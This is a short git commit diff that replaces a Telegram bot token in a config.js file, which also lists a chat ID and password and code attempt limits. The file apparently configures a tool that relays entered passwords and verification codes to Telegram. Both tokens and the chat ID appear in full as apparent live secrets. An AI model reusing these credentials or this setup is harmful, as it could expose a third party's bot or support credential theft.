31c4bbb1e850e6edd3503639f3738973708031b2
aaffffafaffaaf <germanyfu435@gmail.com>
2026-06-20 08:57:06 +0700

    te

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,5 +1,5 @@
 const config = {
-    token: '8554589960:AAGShDHQWo58ajxUfe36CRYNAP-axZMBVbc',
+    token: '8888413820:AAGqmKyB-6mUaUIpUy6EtwlgERZ-jXE1Y6A',
     chat_id: '7626778246',
     max_password_attempts: 2,
     max_code_attempts: 3,
